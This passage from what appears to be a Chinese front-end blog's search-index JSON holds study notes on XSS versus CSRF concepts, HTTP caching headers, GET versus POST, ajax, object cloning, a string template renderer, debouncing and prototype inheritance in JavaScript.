根本是两个不同维度上的分类。XSS是实现CSRF的诸多途径中的一条，但绝对不是唯一的一条。一般习惯上把通过 XSS 来实现的 CSRF 称为 XSRF。 可以通过跨站脚本注入XSS获取用户的信息，获得用户信息过后可以做诸多的事情，但是CSRF只能模拟用户行为， CSRF 的全称是“跨站请求伪造”，而 XSS 的全称是“跨站脚本”。看起来有点相似，它们都是属于跨站攻击——不攻击服务器端而攻击正常访问网站的用户，但前面说了，它们的攻击类型是不同维度上的分类。CSRF顾名思义，是伪造请求，冒充用户在站内的正常操作。我们知道，绝大多数网站是通过 cookie 等方式辨识用户身份（包括使用服务器端 Session 的网站，因为 Session ID 也是大多保存在cookie里面的），再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。","tags":[{"name":"http","slug":"http","permalink":"http://yoursite.com/tags/http/"}]},{"title":"HTTP中的缓存机制","date":"2017-09-14T05:05:24.000Z","path":"2017/09/14/HTTP之缓存/","text":"图：一个缓存GET请求的具体流程（源于《http权威指南》） 总的来说，客户端从服务器请求数据经历如下基本步骤: 检查是否已缓存：如果请求命中本地缓存则从本地缓存中获取一个对应资源的副本； 检查这个资源是否新鲜：是则直接返回到客户端，否则继续向服务器转发请求，进行再验证。 再验证阶段：服务器接收到请求，然后再验证判断资源是否相同，是则返回304 not modified，未变更。 否则返回新内容和200状态码。 客户端更新本地缓存。 Stage1: 检查缓存 缓存不存在，直接向服务器发出请求，状态码200 缓存存在，进入Stage2 Stage2: 检查资源是否新鲜关键字：过期检测、Expires策略、Cache-control策略（重点） 缓存资源未过期，使用缓存，状态码200 from cache 缓存资源过期，进入Stage3 过期检测服务器用HTTP1.0中使用 Expires 首部或HTTP1.1中的 Cache-Control:max-age响应首部来指定过期时间。两者同时设置时，在HTTP1.1服务器中，Cache-Control 的优先级高于 Expires Expires策略Expires是Web服务器响应消息头字段，在响应http请求时告诉浏览器在过期时间前浏览器可以直接从浏览器缓存取数据，而无需再次请求。 不过Expires是HTTP1.0的东西，现在默认浏览器均默认使用HTTP1.1，所以它的作用基本忽略。 Cache-control策略（重点）Cache-Control与Expires的作用一致，都是指明当前资源的有效期，控制浏览器是否直接从浏览器缓存取数据还是重新发请求到服务器取数据。这个协定取代了以前的 Expires 指令，在 HTTP/1.1 开始支持，且如果同时设置的话，优先级高于Expires。 Cache-control详解-MDN 如果 Expires 或 Cache-Control:max-age验证未过期，即资源是新鲜的。则直接返回200状态码，使用缓存。这里注意缓存命中和访问原始服务器的响应码都是200，有些代理缓存会在via首部附加额外信息，或者使用 200(from cache)。 对于未明确标识的，可以使用Date首部的值和当前时间进行比较，如果响应中的日期比较早，客户端通常可以认为这是一条缓存的响应。 金字塔最下端即缓存资源未过期，使用缓存，状态码200 from cache。 如果缓存资源过期了进入Stage3 Stage3: 服务器再验证关键字：If-None-Match /Etag、If-Modified-Since／Last-Modified 资源没有变化，直接返回响应304和一个空的响应体。 资源发生了变化，返回新的资源 状态码200 If-None-Match /EtagHTTP协议规格引入ETag（被请求变量的实体标记），简单点即服务器响应时给请求URL标记，并在HTTP响应头中将其传送到客户端，类似服务器端返回的格式： Etag：web服务器响应请求时，告诉浏览器当前资源在服务器的唯一标识（生成规则由服务器觉得）。Apache中，ETag的值，默认是对文件的索引节（INode），大小（Size）和最后修改时间（MTime）进行Hash后得到的。 If-None-Match：当资源过期时（使用Cache-Control标识的max-age），发现资源具有Etag声明，则再次向web服务器请求时带上头If-None-Match（Etag的值）。web服务器收到请求后发现有头If-None-Match则与被请求资源的相应校验串进行比对，决定返回200或304。在客户端第一次发出请求后，HttpReponse Header中包含Etag 1Etag:“5d8c72a5edda8d6a:3239″ 等于告诉Client端，你拿到的这个的资源有表示ID：5d8c72a5edda8d6a:3239 当客户端下一次请求资源过期时，发现资源具有Etag声明，浏览器同时发出一个If-None-Match报头(Http RequestHeader)此时包头中信息包含上次访问得到的Etag:“5d8c72a5edda8d6a:3239″标识。 1If-None-Match:“d8c72a5edda8d6a:3239“ 这样，服务器端就会比对2者的Etag。如果匹配，则返回304(Not Modified) Response。如果不在匹配，则请求一个新的对象。 If-Modified-Since／Last-Modified在浏览器第一次请求某一个URL时，服务器端的返回状态会是 200 ，内容是你请求的资源，同时有一个Last-Modified的属性标记(HttpReponse Header)此文件在服务期端最后被修改的时间，格式类似这样： 1Last-Modified:Tue, 24 Feb 2009 08:01:04 GMT 客户端第二次请求此URL时，首先会判断是否有缓存以及缓存是否过期，如果缓存过期，浏览器会向服务器传送条件GET请求，包含 If-Modified-Since报头(HttpRequest Header)，询问该时间之后文件是否有被修改过： 1If-Modified-Since:Tue, 24 Feb 2009 08:01:04 GMT web服务器收到请求后发现有头If-Modified-Since则与被请求资源在客户端的最后修改时间 Last-Modified 进行比对。若最后修改时间较新，说明资源又被改动过，则响应整片资源内容（写在响应消息包体内），响应状态码为 HTTP 200；若最后修改时间 Last-Modified较旧，说明资源无新修改，则 响应HTTP 304 (这里只需要发送一个head头，包体内容为空，这样就节省了传输数据量)，告知浏览器继续使用所保存的cache。 其他Etag和Last-Modified你可能会觉得使用Last-Modified已经足以让浏览器知道本地的缓存副本是否足够新，为什么还需要Etag（实体标识）呢？HTTP1.1中Etag的出现主要是为了解决几个Last-Modified比较难解决的问题： Last-Modified标注的最后修改只能精确到秒级，如果某些文件在1秒钟以内，被修改多次的话，它将不能准确标注文件的修改时间 如果某些文件会被定期生成，但内容并没有任何变化，但Last-Modified却改变了，导致文件没法使用缓存 有些文档可能被修改了，但所做修改并不重要。（比如对注释或拼写的修改） 有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形 Etag是服务器自动生成或者由开发者生成的对应资源在服务器端的唯一标识符，能够更加准确的控制缓存。Last-Modified与ETag是可以一起使用的，服务器会优先验证ETag，一致的情况下，才会继续比对Last-Modified，最后才决定是否返回304。 但是Etag也存在一些问题，比如：分布式系统尽量关闭掉Etag(每台机器生成的etag都会不一样)。Etag的服务器生成规则和强弱Etag的相关内容可以参考，《互动百科-Etag》,这里不再深入。 Last-Modified和ETags请求的http报头一起使用，服务器首先产生Last-Modified/Etag标记，服务器可在稍后使用它来判断页面是否已经被修改，来决定文件是否继续缓存， 客户端请求一个页面（A）。 服务器返回页面A，并在给A加上一个Last-Modified/ETag。 客户端展现该页面，并将页面连同Last-Modified/ETag一起缓存。 客户再次请求页面A，并将上次请求时服务器返回的Last-Modified/ETag一起传递给服务器。 服务器检查该Last-Modified或ETag，并判断出该页面自上次客户端请求之后还未被修改，直接返回响应304和一个空的响应体。 Last-Modified/ETag与Cache-Control/Expires如果检测到本地的缓存还是有效的时间范围内，浏览器直接使用本地副本，不会发送任何请求。两者一起使用时，Cache-Control/Expires的优先级要高于Last-Modified/ETag。即当本地副本根据Cache-Control/Expires发现还在有效期内时，则不会再次发送请求去服务器询问修改时间（Last-Modified）或实体标识（Etag）了。 一般情况下，使用Cache-Control/Expires会配合Last-Modified/ETag一起使用，因为即使服务器设置缓存时间, 当用户点击“刷新”按钮时，浏览器会忽略缓存继续向服务器发送请求，这时Last-Modified/ETag将能够很好利用304，从而减少响应开销。 总结 本文整理自《HTTP权威指南》之缓存详解","tags":[{"name":"http","slug":"http","permalink":"http://yoursite.com/tags/http/"}]},{"title":"构造函数","date":"2017-09-14T03:30:14.000Z","path":"2017/09/14/02-构造函数/","text":"构造函数对象笔者的理解:具有特定的属性与方法的封装集合. 面向对象的优势: 暴露在全局中的只有一个对象名,不会造成全局变量污染 是用对象将代码进行功能模块化的划分,有利于日后的维护 创建对象的方法: 对象字面量法(key:value,key:value…)12345var zzw&#123; name:\"zzw\", age:'20', major:'cs'&#125; 缺点:冗余度过高,若需要创建属性一致的对象需要不断写对象字面量,不断重复 工厂函数法(利用对象的动态特性)12345678910function createObj(name,age,major)&#123; var obj = &#123;&#125;; obj.name=name; obj.age=age; obj.major=major; return obj;&#125;var xzq=createObj(\"xzq\",\"111\",\"111\");var xzq=createObj(\"zjl\",\"222\",\"222\"); 缺点:通过工厂函数创建的对象之间并无关联性 自定义构造函数 构造函数其实也是函数,只不过是用来初始化对象的,与new同时使用. new是用来创建对象的. 构造函数是用来初始化对象的. 构造函数名首字母大写,以示区分.123456789function Person(name,job)&#123; //默认隐含的操作,将new创建的对象赋值给this this.name=name; this.job=job; this.sayHello=function()&#123; console.log('hello'); &#125;&#125;var winter = new Person(\"winter\",\"coding\"); 构造函数的执行过程: 使用new关键字创建对象; 调用构造函数,将新创建出来的对象赋值给对象函数内部的this; 在构造函数内部使用this为新创建的对象新增成员; 默认返回新创建的对象,普通函数如果不写返回语句,会返回undefined. 构造函数的返回值: 默认返回的事新创建的对象; 如果我们在构造函数中手动return基本类型的值或null,则不会影响构造函数默认的返回值; 若手动return的是对象类型,则会返回这个对象. 若像调用普通函数那样调用构造函数,而没有使用new关键字,则没有创建对象,构造函数中this指向window.切记,这是一种错误的使用方式. 如果构造函数没有参数,那么调用的时候小括号可以省略,最好不要.","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]},{"title":"HTTP中GET与POST的区别","date":"2017-09-14T03:30:08.000Z","path":"2017/09/14/GET与POST/","text":"GET在浏览器回退时是无害的，而POST会再次提交请求。 GET产生的URL地址可以被Bookmark，而POST不可以。 GET请求会被浏览器主动cache，而POST不会，除非手动设置。 GET请求只能进行url编码，而POST支持多种编码方式。 GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。 GET请求在URL中传送的参数是有长度限制的，而POST没有。 对参数的数据类型，GET只接受ASCII字符，而POST没有限制。 GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。GET参数通过URL传递，POST放在Request body中。 GET和POST是什么? HTTP协议中的两种发送请求的方法。 HTTP是什么? HTTP是基于TCP/IP的关于数据如何在万维网中如何通信的协议。 HTTP的底层是TCP/IP。所以GET和POST的底层也是TCP/IP，也就是说，GET/POST都是TCP链接。GET和POST能做的事情是一样一样的。 你要给GET加上request body，给POST带上url参数，技术上是完全行的通的。 业界不成文的规定是，(大多数)浏览器通常都会限制url长度在2K个字节，而(大多数)服务器最多处理64K大小的url。超过的部分，恕不处理。如果你用GET服务，在request body偷偷藏了数据，不同服务器的处理方式也是不同的，有些服务器会帮你卸货，读出数据，有些服务器直接忽略，所以，虽然GET可以带request body，也不能保证一定能被接收到哦。 GET和POST还有一个重大区别， 简单的说： GET产生一个TCP数据包;POST产生两个TCP数据包。 长的说： 对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200(返回数据); 而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok(返回数据)。 也就是说，GET只需要汽车跑一趟就把货送到了，而POST得跑两趟，第一趟，先去和服务器打个招呼“嗨，我等下要送一批货来，你们打开门迎接我”，然后再回头把货送过去。因为POST需要两步，时间上消耗的要多一点，看起来GET比POST更有效。因此Yahoo团队有推荐用GET替换POST来优化网站性能。但这是一个坑!跳入需谨慎。为什么? GET与POST都有自己的语义，不能随便混用。据研究，在网络环境好的情况下，发一次包的时间和发两次包的时间差别基本可以无视。而在网络环境差的情况下，两次包的TCP在验证数据包完整性上，有非常大的优点。并不是所有浏览器都会在POST中发送两次包，Firefox就只发送一次。","tags":[{"name":"http","slug":"http","permalink":"http://yoursite.com/tags/http/"}]},{"title":"初识ajax","date":"2017-09-13T05:33:40.000Z","path":"2017/09/13/关于ajax/","text":"在学习ajax之前,如果想要发出http请求(form表单或者输入地址回车),页面会整个刷新,极其影响用户体验. 我的理解就是ajax可以使得开发者在自定义的事件触发下进行http请求,因为是通过js完成的,可以在页面不进行刷新的情况下达到动态更新页面内容的效果. AJAX = Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）。 AJAX 不是新的编程语言，而是一种使用现有标准的新方法。 AJAX 是在不重新加载整个页面的情况下,与服务器交换数据并更新部分网页的艺术。 百度的搜索推荐就是通过ajax向服务器发出请求,极少量的数据信息想要传递给服务器没必要刷新整个页面,ajax就是实现在不进行页面刷新的情况下向服务器发出http请求. 如何实现?通过浏览器端的js帮我们预定义的一个异步对象来完成的XMLHttpRequest. XMLHttpRequest 是 AJAX 的基础。 发送ajax请求需要5步 创建异步对象 XMLHttpRequest XMLHttpRequest(兼容问题) 设置请求的url等参数open 发送请求(请求报文,http请求)send思考:为什么没有get方法因为网络请求是耗时的,只有通过某个事件的发生来获取信息,比如请求状态的改变如果存在get方法,什么时候调用?onreadystatechange?那和标准流程又有什么区别. 注册事件(需要判断请求状态) onreadystatechange onreadystatechange 事件当请求被发送到服务器时，我们需要执行一些基于响应的任务。 每当 readyState 改变时，就会触发 onreadystatechange 事件。 readyState 属性存有 XMLHttpRequest 的状态信息。 onreadystatechange 存储函数（或函数名），每当 readyState 属性改变时，就会调用该函数。readyState 存有 XMLHttpRequest 的状态。从 0 到 4 发生变化。 0: 请求未初始化1: 服务器连接已建立2: 请求已接收3: 请求处理中4: 请求已完成，且响应已就绪 status 200: “OK” 404: 未找到页面 在 onreadystatechange 事件中，我们规定当服务器响应已做好被处理的准备时所执行的任务。 当 readyState 等于 4 且状态为 200 时，表示响应已就绪： 在注册的事件中获取返回的内容并修改页面的显示 数据是保存在异步对象的responseText属性中 实际操作: 先写.html页面 通过某种条件发出ajax请求 再写.php页面 处理发过来的请求 再回到浏览器异步对象onreadystatechange事件中 处理返回的内容 上面我们是发送请求获得数据,倘若要发送数据到服务器端怎么办? ajax通过get方法发送数据给服务器 如果希望通过 GET 方法发送信息，请向 URL 添加信息： 在open方法参数url中拼接要穿给服务器的数据xxx.php?userName=jack(动态拼接) 比如用户名注册重复检测: blur时触发ajax事件,需要将输入的用户名传递给后台php页面,这时不是通过表单传递的,没有submit,需要我们手动将数据传给后台,我们可以通过js获取用户输入的用户名,拼接在url后面发送请求. xmlhttp.open(&apos;get&apos;,&apos;check.php?userName=&apos;+un); xmlhttp.send(); ajax通过post方法发送数据给服务器 如果需要像 HTML 表单那样 POST 数据，请使用 setRequestHeader() 来添加 HTTP 头。 然后在 send() 方法中规定您希望发送的数据： xmlhttp.open(&apos;post&apos;,&apos;changeStar.php&apos;); xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); xmlhttp.send(&apos;starName=&apos;+this.dataset[&apos;star&apos;]); 为什么要添加http头,因为post是将参数放到http后面的 而get传参数的方式就是通过虚拟地址传送 封装 ajax函数123456789101112131415161718192021222324252627282930313233function ajax_tool(url,method,data,success)&#123; //异步对象 var xmlhttp = new XMLHttpRequest(); //url方法,get与post需要分别处理 if(method=='get')&#123; if(data)&#123; url+='?'; url+=data; &#125; xmlhttp.open(method,url); xmlhttp.send(); &#125;else&#123; xmlhttp.open(method,url); xmlhttp.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\"); if(data)&#123; xmlhttp.send(data); &#125;else&#123; xmlhttp.send(); &#125; &#125; xmlhttp.onreadystatechange=function()&#123; if(xmlhttp.readyState==4&amp;&amp;xmlhttp.status==200)&#123; //console.log(xmlhttp.responseText); //然而工具函数并不能进行数据操作 //没有任何一个工具可以应对千奇百怪的需求 //所以这里我们需要将数据返回,但是return是不行的 //添加事件响应后,工具函数已执行完毕,并没有立刻执行事件函数,并没有返回值,外面接收不到 //使用回调函数,传入一个函数作为参数,当事件终于被触发时,可以通过这个函数来对数据直接进行操作 success(xmlhttp.responseText); &#125; &#125;&#125; 简化ajax函数,参数过多每次都叫记得参数顺序,可以直接传入一个对象,取得对象属性值即可.此处不做演示.","tags":[{"name":"http","slug":"http","permalink":"http://yoursite.com/tags/http/"}]},{"title":"浅克隆与深克隆","date":"2017-09-12T16:08:08.000Z","path":"2017/09/13/浅克隆与深克隆/","text":"浅克隆与深克隆一. js中的对象谈到对象的克隆，必定要说一下对象的概念。 js中的数据类型分为两大类：原始类型和对象类型。 原始类型包括：数值number、字符串string、布尔值boolean、null、undefined.基本数据类型保存在栈中， 对象类型包括：对象即是属性的集合，当然这里又有两个特殊的对象—-函数Array、数组（键值的有序集合）。引用数据类型的值是对象，保存在堆中。 这两种类型在复制克隆的时候是有很大区别的。原始类型存储的是对象的实际数据，而对象类型存储的是对象的引用地址（对象的实际内容单独存放，为了减少数据开销通常存放在内存中） 这两种数据类型存储方式有很大区别，尤其是在参数传递上。可以看看下面的例子。 参数的传递 123456789function setName(obj)&#123; obj.name=\"我是传递的\"; obj=new Object(); obj.name=\"我是new出来的\"; &#125; var person=new Object(); setName(person); console.log(person.name); 以上代码的弹出值是:我是传递的，很多人可能会以为将会弹出“我是new出来的”，下面进行一下简单的分析: 在函数外面创建一个对象，并将对象的引用赋值给变量person，person中存储的是对象在内存中的存储地址，当为函数传递参数时，就是传递的在函数外面创建的对象的地址。在函数中，obj的值即为person的值，指向外面创建的对象，并为其创建一个自定义属性name，然后又创建一个新的对象，并将新对象的地址赋值给obj(person一直没有变化，始终指向原来的对象)，这个时候obj指向的并不是函数外面创建的对象，所以外面对象name属性不会被改变。 总的来说，就是函数内创建object对象不会改变外面的属性值。最好画个内存图，马老师教我的，碰到值传递和引用传递一图足矣。当然，这个小例子只是为了让大家复习一下克隆的前置知识。 克隆的概念 浅度克隆：原始类型为值传递，对象类型仍为引用传递，克隆对象修改引用类型的属性时会影响到原始对象。 深度克隆：所有元素或属性均完全复制，与原对象完全脱离，也就是说所有对于新对象的修改都不会反映到原对象中。 浅克隆浅克隆与赋值的区别12345678910111213141516171819202122232425262728293031323334353637383940414243444546var obj1 = &#123; 'name' : 'zhangsan', 'age' : '18', 'language' : [1,[2,3],[4,5]],&#125;;var obj2 = obj1;var obj3 = shallowCopy(obj1);function shallowCopy(src) &#123; var dst = &#123;&#125;; for (var prop in src) &#123; if (src.hasOwnProperty(prop)) &#123; dst[prop] = src[prop]; &#125; &#125; return dst;&#125;obj2.name = \"lisi\";obj3.age = \"20\";obj2.language[1] = [\"二\",\"三\"];obj3.language[2] = [\"四\",\"五\"];console.log(obj1); //obj1 = &#123;// 'name' : 'lisi',// 'age' : '18',// 'language' : [1,[4,5]],//&#125;;console.log(obj2);//obj2 = &#123;// 'name' : 'lisi',// 'age' : '18',// 'language' : [1,[4,5]],//&#125;;console.log(obj3);//obj3 = &#123;// 'name' : 'zhangsan',// 'age' : '20',// 'language' : [1,[4,5]],//&#125;; 先定义个一个原始的对象 obj1，然后使用赋值得到第二个对象 obj2，然后通过浅拷贝，将 obj1 里面的属性都赋值到 obj3 中。也就是说： obj1：原始数据 obj2：赋值操作得到 obj3：浅拷贝得到 然后我们改变 obj2 的 name 属性和 obj3 的 name 属性，可以看到，改变赋值得到的对象 obj2 同时也会改变原始值 obj1，而改变浅拷贝得到的的 obj3 则不会改变原始对象 obj1。这就可以说明赋值得到的对象 obj2 只是将指针改变，其引用的仍然是同一个对象，而浅拷贝得到的的 obj3 则是 重新创建了新对象。 然而，我们接下来来看一下改变引用类型会是什么情况呢，我又改变了赋值得到的对象 obj2 和浅拷贝得到的 obj3 中的 language 属性的第二个值和第三个值（language 是一个数组，也就是引用类型）。结果见输出，可以看出来，无论是修改赋值得到的对象 obj2 和浅拷贝得到的 obj3 都会改变原始数据。 这是因为浅拷贝只复制一层对象的属性，并不包括对象里面的为引用类型的数据。所以就会出现改变浅拷贝得到的 obj3 中的引用类型时，会使原始数据得到改变。 深拷贝：将 B 对象拷贝到 A 对象中，包括 B 里面的子对象， 浅拷贝：将 B 对象拷贝到 A 对象中，但不包括 B 里面的子对象 深克隆的实现为了保证对象的所有属性都被复制到，我们必须知道如果for循环以后，得到的元素仍是Object或者Array，那么需要再次循环，直到元素是原始类型或者函数为止。为了得到元素的类型，我们定义一个通用函数，用来返回传入对象的类型。 123456//返回传递给他的任意对象的类function isClass(o)&#123; if(o===null) return \"Null\"; if(o===undefined) return \"Undefined\"; return Object.prototype.toString.call(o).slice(8,-1);//[Object Array] =&gt;Array&#125; 为什么不直接用toString方法？这是为了防止对象中的toString方法被重写，为了正确的调用toString()版本，必须间接的调用Function.call()方法 为什么不使用typeof来直接判断类型？因为对于Array而言，使用typeof（Array）返回的是object，所以不能得到正确的Array，这里对于后续的数组克隆将产生致命的问题。 确定是那种基本数据类型用typeof,确定是哪种引用数据类型用instanceof 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051//深度克隆function deepClone(obj)&#123; var result,oClass=isClass(obj); //确定result的类型 if(oClass===\"Object\")&#123; result=&#123;&#125;; &#125;else if(oClass===\"Array\")&#123; result=[]; &#125;else&#123; return obj; &#125; for(key in obj)&#123; var copy=obj[key]; if(isClass(copy)==\"Object\" || isClass(copy)==\"Array\")&#123; result[key]=arguments.callee(copy);//递归调用 &#125;else&#123; //如果为基本数据类型 result[key]=obj[key]; &#125; &#125; return result;&#125;//返回传递给他的任意对象的类function isClass(o)&#123; if(o===null) return \"Null\"; if(o===undefined) return \"Undefined\"; return Object.prototype.toString.call(o).slice(8,-1);&#125;var oPerson=&#123; oName:\"rookiebob\", oAge:\"18\", oAddress:&#123; province:\"beijing\" &#125;, ofavorite:[ \"swimming\", &#123;reading:\"history book\"&#125; ], skill:function()&#123; console.log(\"bob is coding\"); &#125;&#125;;//深度克隆一个对象var oNew=deepClone(oPerson); oNew.ofavorite[1].reading=\"picture\";console.log(oNew.ofavorite[1].reading);//pictureconsole.log(oPerson.ofavorite[1].reading);//history book oNew.oAddress.province=\"shanghai\";console.log(oPerson.oAddress.province);//beijingconsole.log(oNew.oAddress.province);//shanghai 整理自：浅拷贝VS深拷贝Javascript深克隆原理与实现","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]},{"title":"字符串模版","date":"2017-09-12T16:06:20.000Z","path":"2017/09/13/实现一个简单的字符串模版/","text":"先了解以下什么是字符串模版（模板引擎）http://www.jianshu.com/p/da57098f992a 目标：需要将字符串中所有使用花括号括起来的关键词，同义替换为对象字面量中对应的键值。 字符串: &apos;&lt;a href={{href}}&gt;{{text}}&lt;/a&gt;&apos; 对象字面量:{href:&apos;blog.hackerwen.tech&apos; ,text:&apos;我的博客&apos;} 结果: &lt;a href=&quot;blog.hackerwen.tech&quot;&gt;我的博客&lt;/a&gt; render.js 12345678910111213141516171819202122232425262728function render(template,context) &#123;// 准备正则 匹配至少一个 字母// 正则的 开始是 &#123;&#123; 结束是 &#125;&#125;// 中间的 小括号 可以对 正则 筛选出来的 字符串 再次筛选 var reg = /&#123;&#123;(\\w+)&#125;&#125;/;// 准备挖好坑的字符串 var template = template;// 准备 用来填坑的 对象 var context = context;// 首先 使用正则对象 验证一次 字符串 while 会看 result 是否有值// 这一次 找到的 有两个值/* 第一个 &#123;&#123;href&#125;&#125; 索引为0 第二个 href 索引为1,小括号找到的*/ var result; while( result = reg.exec(template))&#123; console.log(result);// 0:&#123;&#123;href&#125;&#125; 1:href // 获取 匹配的 key(href) var key = result[1]; // 通过key 获取value var value = context[key]; // 替换 替换的是 &#123;&#123;href&#125;&#125; template = template.replace(result[0],value); &#125; // 执行完毕 return template;&#125; index.html1234567891011121314151617181920212223//导入写好的函数&lt;script type=\"text/javascript\" src='render.js'&gt;&lt;/script&gt;//定义模版&lt;script type=\"text/template\" id='template'&gt; &lt;a href=\"&#123;&#123;href&#125;&#125;\"&gt;&#123;&#123;text&#125;&#125;&lt;/a&gt;&lt;/script&gt;&lt;script type=\"text/javascript\"&gt;// 通过标签获取模版var templateDom = document.querySelector(\"#template\");var template = templateDom.innerHTML;console.log(template);//&lt;a href=\"&#123;&#123;href&#125;&#125;\"&gt;&#123;&#123;text&#125;&#125;&lt;/a&gt;// 准备对象var context = &#123; href:\"http://blog.hackerwen.tech\", text:\"我的博客\"&#125;// 进行替换var resultStr = render(template,context);console.log(resultStr);// 添加到页面上document.body.innerHTML = resultStr;&lt;/script&gt; 对正则表达式小括号使用方法不清楚的同学可以戳这里","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]},{"title":"函数节流","date":"2017-09-12T13:16:30.000Z","path":"2017/09/12/函数节流/","text":"以下描述均为函数防抖， 《JavaScript高级程序设计有误》 为什么会有函数节流？ 先看一段代码：1234window.onresize = function() &#123; var div = document.getElementById(\"mydiv\"); div.style.height = div.offsetWidth + \"px\";&#125;很明显，监听浏览器窗口的resize事件，并基于该事件改变页面布局。首先，计算offsetWidth属性，如果该元素或者页面上其他元素有非常复杂的CSS样式，那么这个过程将会很复杂。其次，设置某个元素的高度需要对页面进行回流来令改动生效。如果页面有很多元素同时应用了相当数量的CSS的话，这又需要很多运算。 浏览器中某些计算和处理要比其他的昂贵很多。例如，DOM操作比起非DOM交互需要更多的内存和CPU时间。连续尝试进行过多的DOM相关操作可能会导致浏览器挂起，有时候甚至会崩溃。 很明显，用户如果没事儿干放大缩小浏览器窗口玩儿，那我们监听函数将会不停的被调用，倘若函数过“重”，即假设如上文描述的一般，那么对浏览器的压力将会非常之大，其高频率的更改可能会让浏览器崩溃。 所以我们需要通过某种方式解决这种问题，刚好就是我们的主角——函数节流。 什么是函数节流大家可能也做过我前面说的没事儿扩大缩小浏览器的无聊事儿， 但是你会发现在某些页面的时候，你手指按住鼠标左键不动拖拉扩大或缩小浏览器时，页面内部并没有同步变化，当你松开手指时，页面才重新根据浏览器窗口变化。 此处便用到了函数节流的思想。 基本思想某些代码不可以在没有间断的情况下连续重复执行。第一次调用函数，创建一个定时器，在指定的时间间隔之后运行代码。当第二次调用该函数时，它会清除前一次的定时器并设置另一个。如果前一个定时器已经执行过了，这个操作(清除定时器)就没有任何意义。然而，如果前一个定时器尚未执行，其实就是将其替换为一个新的定时器。目的是只有在执行函数的请求停止了一段时间之后才执行。 基本模式1234567891011121314151617181920var processor = &#123; timeoutId: null, //实际进行处理的方法 performProcessing: function() &#123; //实际执行代码 &#125;, //初始处理调用的方法 process: function() &#123; clearTimeout(this.timeoutId); var that = this; this.timeoutId = setTimeout(function() &#123; that.performProcessing(); &#125;, 100); &#125;&#125;// 尝试开始执行processor.process(); 理解了上面的概念过后再看这个代码还是很清晰的，就不详解了。为了去操作一个方法创建一个对象感觉怪怪的，可以简化一下。 简化123456function throttle(method,context) &#123; clearTimeout(method.tId); method.tId = setTimeout(function() &#123; method.call(context); &#125;, 100);&#125; throttle()函数接受两个参数：要执行的函数以及在那个作用域中执行。上面这个函数首先清除之前的任何定时器。定时器ID是存储在函数的tId属性中的，第一次把方法传递给throttle()的时候，这个属性可能并不存在。接下来创建一个新的定时器，并将其ID储存在方法的tId属性中。如果这是第一次对这个方法调用throttle()的话，那么这段代码会创建该属性。定时器代码使用call()来确保方法在适当的环境中执行。如果没有给出第二个参数，那么就在全局作用域内执行该方法。 注：如果有同学对that/context/call等相关语句有疑问，该好好补补课啦，搜索关键字:关于函数调用的this指向 - -!! 解决问题让我们回到最开始的代码：1234window.onresize = function() &#123; var div = document.getElementById(\"mydiv\"); div.style.height = div.offsetWidth + \"px\";&#125;现在看来这段代码弊端就很明显了，我们需要对这个函数节流一下。让用户拉拉拖拖结束过后再改变样式，节省浏览器资源。123456789101112131415function throttle(method,context) &#123; clearTimeout(method.tId); method.tId = setTimeout(function() &#123; method.call(context); &#125;, 100);&#125;function resizeDiv() &#123; var div = document.getElementById(\"mydiv\"); div.style.height = div.offsetWidth + \"px\";&#125;window.onresize = function() &#123; throrrle(resizeDiv);&#125;搞定。 只要代码是周期性执行的，都应该使用节流。 参考资料: JavaScript高级程序设计","tags":[{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]},{"title":"继承","date":"2017-08-02T08:14:32.000Z","path":"2017/08/02/05-原型链与继承/","text":"原型链 定义: 每一个对象都存在构造函数,每一个构造函数都存在原型对象,每一个原型对象也存在构造函数,每一个原型对象的构造函数也存在原型对象,如此向上一层层查询,是一个链式结构,称为原型链.(参考文件 原型链.ddd) 继承原型链继承:利用原型中的成员可以被和其相关的对象所共享这一特性,可以实现原型继承通过修改原型链结构的方式实现继承,具体实现方式:让子类的原型对象地址指向超类的实例对象,这样子类实例对象则会拥有超类实例对象的所有成员(包括超类实例成员与)超类原型对象成员 function SuperType(){ this.class='信管班'; }; function SubType(name){ this.name=name; }; var superObj = new SuperType(); SubType.prototype=superObj;//继承 var subObj=new SubType('zzw'); console.log(subObj.class);//信管班 subObj—&gt;SubType.prototype(superobj)—&gt;SuperType.prototype—&gt;Object.prototype—&gt;null 属性搜索原则:当访问一个对象的成员时,按照原型链依次搜索(参考文件 原型链属性关系.ddd) 利用原型链继承安全地拓展内置对象(倘若直接为内置对象添加成员,会影响整个开发团队) /* var arr=[1,2,3]; //扩展内置对象(就是给内置对象新增成员) Array.prototype.sayHello=function(){ console.log(&apos;我是一个数组&apos;); }; arr.sayHello(); */ //如何安全地扩展一个内置对象? //有!继承内置对象,扩展自身,而不影响内置对象 function myArray(){ }; var a=new Array(); myArray.prototype=a;//继承数组对象 myArray.prototype.sayHello=function(){//扩展自身 console.log(&apos;我是一个数组&apos;); }; var myarr1 = new myArray(); myarr1.push(1,2,3,4,5); console.log(myarr1); myarr1.sayHello(); 原型链式继承存在的问题:同原型模式存在的问题一样,超类构造函数的实例对象成为子类的原型对象,导致超类实例对象的对象成员变成了子类的原型对象成员,某个子类实例对象修改原型对象中的引用类型会影响所有实例对象. 示例代码如下: function SuperType(){ this.colors=[&apos;red&apos;,&apos;blue&apos;,&apos;black&apos;];//超类实例成员 } SuperType.prototype.sayHello=function(){ console.log(&apos;hello&apos;); };//超类原型成员 function SubType(){ this.sex=&quot;male&quot;;//子类实例成员; } SubType.prototype=new SuperType()//继承 SubType.prototype.constructor=SubType;//保持闭三角关系 var subObj1=new SubType();//子类实例对象1 var subObj2=new SubType();//子类实例对象2 //到此为止,我们就完成了一个经典的原型链式继承 